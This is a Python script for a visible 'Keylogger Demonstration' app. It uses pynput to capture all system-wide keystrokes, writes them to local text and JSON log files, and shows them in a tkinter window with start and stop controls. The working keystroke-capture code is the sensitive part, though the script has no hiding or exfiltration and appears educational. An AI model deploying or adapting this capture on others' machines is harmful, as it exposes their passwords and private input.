from pynput import keyboard
import json
import tkinter as tk
from tkinter import messagebox

key_list = []
key_strokes = ""
listener = None


# ---------------- FILE HANDLING ----------------

def clear_logs():
    global key_list, key_strokes
    key_list = []
    key_strokes = ""

    with open("logs.txt", "w") as f:
        f.write("")

    with open("log.json", "w") as f:
        json.dump([], f, indent=2)


def update_files(key):
    global key_list

    key_list.append(str(key))

    # TXT FILE
    with open("logs.txt", "a") as f:
        f.write(str(key) + " ")
        f.flush()

    # JSON FILE
    with open("log.json", "w") as f:
        json.dump(key_list, f, indent=2)


# ---------------- KEYLOGGER ----------------

def on_press(key):
    global key_strokes

    key_strokes += str(key) + " "
    update_files(key)

    text_box.delete(1.0, tk.END)
    text_box.insert(tk.END, key_strokes)


def start_keylogger():
    global listener
    if listener is None:
        clear_logs()
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Running", fg="#2ecc71")
    else:
        messagebox.showinfo("Info", "Keylogger already running")


def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        listener = None
        status_label.config(text="Status: Stopped", fg="#ff4d4d")
    else:
        messagebox.showinfo("Info", "Keylogger not running")


# ---------------- GUI ----------------

root = tk.Tk()
root.title("Keylogger Demonstration")
root.geometry("520x380")
root.resizable(False, False)
root.configure(bg="#1e1e2f")

title_label = tk.Label(
    root,
    text="Keylogger Demonstration",
    font=("Segoe UI", 18, "bold"),
    bg="#1e1e2f",
    fg="white"
)
title_label.pack(pady=15)

status_label = tk.Label(
    root,
    text="Status: Not Running",
    font=("Segoe UI", 11, "bold"),
    bg="#1e1e2f",
    fg="#ff4d4d"
)
status_label.pack(pady=5)

btn_frame = tk.Frame(root, bg="#1e1e2f")
btn_frame.pack(pady=10)

tk.Button(
    btn_frame,
    text="Start Keylogger",
    width=18,
    bg="#2ecc71",
    fg="white",
    font=("Segoe UI", 10, "bold"),
    command=start_keylogger
).grid(row=0, column=0, padx=10)

tk.Button(
    btn_frame,
    text="Stop Keylogger",
    width=18,
    bg="#e74c3c",
    fg="white",
    font=("Segoe UI", 10, "bold"),
    command=stop_keylogger
).grid(row=0, column=1, padx=10)

text_box = tk.Text(
    root,
    height=8,
    width=58,
    bg="#0f172a",
    fg="#e5e7eb",
    font=("Consolas", 10),
    insertbackground="white"
)
text_box.pack(pady=15)

root.mainloop()